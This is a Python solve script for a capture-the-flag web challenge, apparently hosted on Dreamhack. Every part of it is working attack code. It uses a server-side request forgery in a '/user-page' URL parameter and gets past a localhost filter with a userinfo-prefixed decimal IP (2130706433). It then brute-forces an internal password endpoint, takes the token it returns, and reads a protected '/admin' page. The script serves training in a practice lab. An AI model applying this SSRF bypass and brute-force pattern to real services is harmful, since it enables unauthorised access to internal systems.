import requests
import re

class Solve: 
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.token = None 
        
    def bypass_localhost(self):
        print("[+] Starting Bypass Localhost")
        payload = "http://example.com@2130706433:5000/"
        response = requests.get(f"{self.baseURL}/user-page", params={"url": payload})
        if response.status_code == 200:
            print("[+] Bypass Localhost Successfully")
            return True
        else:
            print("[-] Failed Bypass Localhost. Try Again")
            return False
        
    def extract_value_password(self):
        print("[+] Continuing Brute_Force PASSWORD")
        for i in range(0, 256): 
            password = f"{i:02X}" 
            payload = f"http://example.com@2130706433:5000/access-token?password={password}"
            response = requests.get(f"{self.baseURL}/user-page", params={"url": payload})

            if "server" in response.text and "Wrong" not in response.text and "Write Password" not in response.text:
                print(f"[+] Found Password: {password}")
                match = re.search(r"[0-9a-fA-F]{32}", response.text)
                if match:
                    self.token = match.group(0)
                    print(f"[+] Extracted token: {self.token}")
                else:
                    print("[!] Token not found in response text")
                break

    def get_flag(self):
        if not self.token:
            print("[-] No token found. Run extract_value_password() first.")
            return
        print("[+] Starting Get FLAG.")
        payload = f"http://example.com@2130706433:5000/admin?token={self.token}"
        response = requests.get(f"{self.baseURL}/user-page", params={"url": payload})
        flag_match = re.search(r"SWAP\{.*?\}", response.text)
        if flag_match:
            print(f"[+] FLAG found: {flag_match.group(0)}")
        else:
            print("[-] FLAG not found. Full response:")
            print(response.text)


if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:16373"
    solve = Solve(BASE_URL)
    if solve.bypass_localhost():
        solve.extract_value_password()
        solve.get_flag()
